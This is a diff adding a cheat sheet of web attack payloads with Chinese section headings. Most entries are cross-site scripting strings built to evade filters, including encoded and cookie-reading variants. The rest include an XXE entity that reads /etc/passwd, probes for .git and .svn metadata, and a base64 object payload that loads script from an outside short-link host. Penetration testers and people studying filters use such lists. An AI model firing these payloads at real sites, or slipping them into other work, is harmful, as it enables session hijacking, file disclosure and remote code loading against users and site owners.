@@ -1,0 +1,193 @@
+<div style="width: expression(document.cookie=true;);">
+<meta http-equiv="refresh" content="3;url=http://cuijianxiong.com" />
+<a href="javascrip&#x0000000000000000074;:prompt(1)">x</a>
+<details open ontoggle=alert(1)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+
+
+<a herf=1onload=alert(1)>xx</a>
+<objectdata=”data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUkd1V0REUz48L3NjcmlwdD4=”></object>
+
+
+富文本xss:
+<span class=”yyy "onmouseover=alert(1);//”></span> 
+
+
+markdown xss:
+
+输入：[test](javascript://%0d%0aprompt(1);com)
+输出：<ahref="javascript://%0d%0aprompt(1);com">test</a>
+
+
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xxe [
+<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+<name>&xxe;</name>
+</root>
+
+
+
+
+&quot;&gt;   &#x27;  \u0022\u003E  /.svn/entries   /.git/config
+最短  <s/onclick=alert()>b
+<keygen onfocus=javascript:alert(1) autofocus>
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+畸形xss
+<img/src=="x onerror=alert(1)//">
+<div/style=="x onclick=alert(1)//">XSS'OR
+<div style=behavior:url(" onclick=alert(1)//">XSS'OR
+<div style=x:x(" onclick=alert(1)//">XSS'OR
+
+
+<![CDATA[<script>alert(1)</script>]]>   浏览器弄死
+
+input标签
+<input type=image src=x onerror=alert`XSS`>
+<!'/*!"/*!//'/*//"/*--!><Input/Autofocus/%0D*/Onfocus=confirm`1`//><Svg>
+<Input/Autofocus/%0D*/Onfocus=confirm`1`//>
+<Input/Autofocus/Onfocus=confirm`1`>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<input onfocus=javascript:alert(1) autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<input autofocus onblur=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<form action=javascript:alert(1)><input type=submit>
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<form method=post onclick=elements[0].value=outerHTML;submit()>
+<input type=hidden name=comment>click me!</form>
+<form action=javascript:alert(1)><input type=submit>
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image 
+<form><input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg>
+<input autofocus onblur=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<form action=javascript:alert(1)><input type=submit> 
+<form><input formaction=javascript:alert(1) type=submit value=click> 
+<form><input formaction=javascript:alert(1) type=image value=click> 
+<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+<input name=USERNAME_PARAMETER_NAME value=USERNAME> 
+<input name=PASSWORD_PARAMETER_NAME value=PASSWORD>
+<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
+<input <img src=x onmouseover=alert(document.cookie)> ...>
+<input onfocus=alert(1) autofocus>
+<INPUT TYPE="BUTTON" action="alert('XSS')"/>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<iframe// src=javaSCRIPT&colon;alert(1)
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<input value=<><iframe/src=javascript:confirm(1)
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div>
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<form oninput="alert(1)"><input type="range"
+<input type="text" value=""onresize=pompt(1) "> // IE 10 docmode
+<form action="Javascript:alert(1)"><input type=submit> // Firefox, IE
+<input type="text"value=""onclick="location=window[`atob`]`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21ha W4p`"/>
+<input type="text" value=""onfocus=location='javascript:alert`1`' autofocus""/>
+<script>a=`jackmasa<!--<script/\`;</script>
+<input value="${alert(1)}`</script/">
+<script>a=`jackmasa<!--<script/\`;</script>
+<input value="${alert(1)}`</script/">
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<input type=text name=foo value=a><script>?<script>>
+<input type=text name=foo value=''onevent=?//'>
+<input type=text name=foo value=""onevent=?//">
+
+
+
+
+
+</script>"><script>prompt(1)</script>
+</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a href="javascript:confirm%28 1%29">Clickme</a>
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+"><textarea autofocus onfocus=prompt(1)>
+"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+"><script>co\u006efir\u006d`1`</script>
+"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+"><img src=x onerror=co\u006efir\u006d`1`>
+"><svg/onload=co\u006efir\u006d`1`>
+"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+"><a href=javascript:prompt%28 1%29>Clickme</a>
+"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+"><textarea autofocus onfocus=co\u006efir\u006d(1)>
+"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+"><img/src=x%0Aonerror=prompt`1`>
+"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+XSS_RANDOM_FLAG_{yuweyAAAA923892389328nsdsdjjkmxcmxnm}
+
+
+
+setTimeout
+
+
+<svg/onload=setTimeout('ale'+'rt(1)',0)>
+
+
+过滤双引号
+
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+
+
+chrome
+
+<img src ?itworksonchrome?\/onerror = alert(1)>
+
+data形式
+
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
+<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></embed>
+<script src=data:%26comma;alert(1)></script>
+
+
+ontoggle
+
+<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">
+
+
+frame
+
+<frame src="javascript:alert(1)">
+<frame src="javascript:%20%0aalert%20%0d %09(1)">
+
+
+iframe
+
+<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
+
+
+url加密绕圆括号（20170328）
+
+<svg onload='JavascRipT:alert%281%29'>
+<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
+
+
+other
+
+<audio src
+<video src
